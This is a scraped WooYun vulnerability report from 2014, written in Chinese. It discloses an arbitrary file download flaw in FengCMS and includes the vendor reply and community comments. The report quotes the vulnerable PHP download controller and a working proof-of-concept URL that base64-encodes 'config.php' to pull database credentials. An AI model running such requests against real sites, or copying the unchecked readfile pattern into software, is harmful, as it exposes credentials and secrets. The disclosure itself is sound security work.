{"id": 53394, "wybug_id": "wooyun-2014-067820", "wybug_title": "fengcms任意文件下载", "wybug_corp": "fengcms.com", "wybug_author": "phith0n", "wybug_date": "2014-07-10 10:54", "wybug_open_date": "2014-10-08 10:56", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向公众公开  简要描述： 2014-07-08 12:40 | FengCMS(乌云厂商) 0FengCms安全测试站地址：http://guf521656.h163.92hezu.org/ 有效期2014-7-8至2014-7-15 欢迎各位安全界的朋友帮我们寻找安全漏洞！作为一个小小的创业团队，对各位朋友对FengCms的关注表示衷心的感谢！既然官方这么说了，我帮个小忙吧，可获得认证码、数据库账号密码等。就用官方给的演示站做测试。不知道你们有没有小礼物呢？ 详细说明：  /app/controller/downController.php代码如下：\nclass downController extends Controller{\tpublic function index(){\t\t$_GET['file']=strip_tags(base64_decode($_GET['file']));\t\tif(file_exists(ROOT_PATH.$_GET['file'])){\t\t\t\t\t\theader(\"Content-Type: application/force-download\");\t\t\theader(\"Content-Disposition: attachment; filename=\".basename($_GET['file'])); \t\t\treadfile(ROOT_PATH.$_GET['file']);\t\t}else{\t\t\techo '<script type=\"text/javascript\">alert(\"您要下载的文件不存在！\");history.back();</script>';\t\t}\t}}\n明显的任意文件下载，只用把要下载的文件base64编码一遍即可。   漏洞证明：  演示站证明：\nhttp://guf521656.h163.92hezu.org/?controller=down&file=Y29uZmlnLnBocA\n即可下载数据库配置文件config.php，里面有数据库账号密码、后台认证码：\n\n   修复方案：  送小礼物的话我可以帮你们修复呀~   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-10 10:57 厂商回复： 非常感谢！小礼物暂时没有，但我们会积极准备的！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-10 12:48 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  赶紧着剁手吧……     \n     2014-07-10 16:22 |    \t\tFengCMS(乌云厂商)\t\t \n  非常感谢各位白帽子的辛勤工作！FengCms安全测试站地址：http://guf521656.h163.92hezu.org/ 已经升级到最新版本 有效期2014-7-8至2014-7-15 欢迎各位安全界的朋友帮我们寻找安全漏洞！作为一个小小的创业团队，对各位朋友对FengCms的关注表示衷心的感谢！     \n     2014-07-10 17:36 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  @phith0n 我看了下他们的补丁。。这思维，唉 现在依旧任意文件下载啊。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}